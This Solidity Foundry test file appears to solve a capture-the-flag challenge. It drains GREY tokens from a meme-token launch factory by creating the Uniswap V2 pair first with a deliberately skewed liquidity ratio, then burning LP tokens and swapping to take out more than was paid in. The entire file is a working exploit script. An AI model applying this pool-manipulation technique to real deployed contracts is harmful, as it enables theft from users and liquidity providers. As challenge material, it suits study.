// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Setup} from "src/Setup.sol";
import {Factory} from "src/Factory.sol";
import {GREY} from "src/lib/GREY.sol";
import {Token} from "src/Token.sol";
import {UniswapV2Pair} from "src/lib/v2-core/UniswapV2Pair.sol";
import {UniswapV2Factory} from "src/lib/v2-core/UniswapV2Factory.sol";
import {IERC20} from "src/lib/v2-core/interfaces/IERC20.sol";
import {console} from "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";

contract Exploit is Test {
    address DEPLOYER = makeAddr("Alice");
    address PLAYER = makeAddr("Bob");
    uint256 constant STARTING_BALANCE = 10 ether;

    Setup setup;
    Factory factory;
    GREY grey;
    Token meme;
    UniswapV2Factory ufactory;

    function setUp() external {
        vm.deal(DEPLOYER, STARTING_BALANCE);
        vm.prank(DEPLOYER);
        setup = new Setup();
        grey = GREY(setup.grey());
        factory = Factory(setup.factory());
        meme = Token(setup.meme());
        ufactory = UniswapV2Factory(setup.uniswapV2Factory());

        vm.deal(PLAYER, STARTING_BALANCE);
    }

    function testExploit() external {
        vm.startPrank(PLAYER);
        setup.claim();

        // Buy 5e18 - 1 GREY worth of MEME
        grey.approve(address(factory), type(uint256).max);
        meme.approve(address(factory), type(uint256).max);
        factory.buyTokens(address(meme), 5 ether - 1, 0);

        console.log("After buying MEME:");
        console.log("GREY balance of PLAYER", grey.balanceOf(PLAYER));
        console.log("MEME balance of PLAYER", meme.balanceOf(PLAYER));
        console.log("");

        ufactory.createPair(address(grey), address(meme));
        address pair = ufactory.getPair(address(grey), address(meme));
        console.log("pair address: ", pair);

        // Wrong direction of skewed ratio
        // grey.transfer(pair, greybalance);
        // meme.transfer(pair, 1);
        grey.transfer(pair, 1);
        meme.transfer(pair, meme.balanceOf(PLAYER));
        uint256 lpToken = UniswapV2Pair(pair).mint(PLAYER);

        factory.launchToken(address(meme));

        console.log("");
        console.log("Before burning LP tokens:");
        console.log("Balance of GREY:", grey.balanceOf(PLAYER));
        console.log("Balance of MEME:", meme.balanceOf(PLAYER));
        console.log("Balance of GREY token in pair:", grey.balanceOf(pair));
        console.log("Balance of MEME token in pair:", meme.balanceOf(pair));

        console.log("Balance of LP Tokens:", UniswapV2Pair(pair).balanceOf(PLAYER));
        UniswapV2Pair(pair).transfer(pair, lpToken);
        UniswapV2Pair(pair).burn(PLAYER);
        
        console.log("");
        console.log("After burning LP tokens:");
        console.log("Balance of GREY:", grey.balanceOf(PLAYER));
        console.log("Balance of MEME:", meme.balanceOf(PLAYER));
        console.log("Balance of GREY token in pair:", grey.balanceOf(pair));
        console.log("Balance of MEME token in pair:", meme.balanceOf(pair));
        console.log("Balance of LP Tokens:", UniswapV2Pair(pair).balanceOf(PLAYER));

        uint256 targetGreyAmount = 5.965 ether - grey.balanceOf(PLAYER);

        meme.transfer(pair, meme.balanceOf(PLAYER));
        bool isGREYToken0 = (UniswapV2Pair(pair).token0() == address(grey));
        UniswapV2Pair(pair).swap(isGREYToken0 ? targetGreyAmount : 0, isGREYToken0 ? 0 : targetGreyAmount, PLAYER, "");

        console.log("");
        console.log("After swapping to get GREY:");
        console.log("Balance of current GREY:", grey.balanceOf(PLAYER));
        console.log("Balance of current MEME:", meme.balanceOf(PLAYER));
        assertTrue(setup.isSolved());

        vm.stopPrank();
    }
}
